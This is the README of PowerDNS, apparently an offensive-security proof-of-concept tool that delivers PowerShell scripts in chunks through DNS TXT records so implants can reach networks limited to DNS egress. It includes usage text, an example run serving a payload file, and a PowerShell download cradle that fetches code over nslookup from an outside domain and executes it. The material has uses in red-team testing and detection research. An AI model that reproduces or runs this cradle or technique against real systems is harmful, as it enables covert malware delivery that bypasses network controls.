```
___                        ___  _ _  ___
| . \ ___  _ _ _  ___  _ _ | . \| \ |/ __>
|  _// . \| | | |/ ._>| '_>| | ||   |\__ \
|_|  \___/|__/_/ \___.|_|  |___/|_\_|<___/

@domchell, MDSec ActiveBreach
```
# Description
PowerDNS is a simple proof of concept to demonstrate the execution of PowerShell script using DNS only.

PowerDNS works by splitting the PowerShell script in to chunks and serving it to the user via DNS TXT records.

Use cases for PowerDNS include delivery of an implant using PowerShell DNS delivery, or where you may need to introduce a PowerShell script to a tightly controlled environment where egress is limited only to DNS.

# Usage:
In order to use PowerDNS, the powerdns.py server should run on the host that is authoritative for a given domain.

PowerDNS takes the file to serve, along with the domain that the server is authoritative for as arguments:
```
# python powerdns.py -h
___                        ___  _ _  ___
| . \ ___  _ _ _  ___  _ _ | . \| \ |/ __>
|  _// . \| | | |/ ._>| '_>| | ||   |\__ \
|_|  \___/|__/_/ \___.|_|  |___/|_\_|<___/

@domchell, MDSec ActiveBreach

usage: powerdns.py [-h] [--file <file>] [--domain <domain>]

optional arguments:
  -h, --help         show this help message and exit
  --file <file>      PowerShell file to serve
  --domain <domain>  Domain with auth NS record
```
# Example:
The following example will serve the psh_payload.ps1 file and can be executed on the target host using the supplied download cradle:
```
# python powerdns.py --file psh_payload.ps1 --domain foobar.com
___                        ___  _ _  ___
| . \ ___  _ _ _  ___  _ _ | . \| \ |/ __>
|  _// . \| | | |/ ._>| '_>| | ||   |\__ \
|_|  \___/|__/_/ \___.|_|  |___/|_\_|<___/

@domchell, MDSec ActiveBreach

[*] PowerDNS: Splitting psh_payload.ps1 in to 18 chunk(s)
[*] PowerDNS: Use the following download cradle:
[*] PowerDNS: powershell "powershell (nslookup -q=txt -timeout=5 0.foobar.com)[-1]"

```
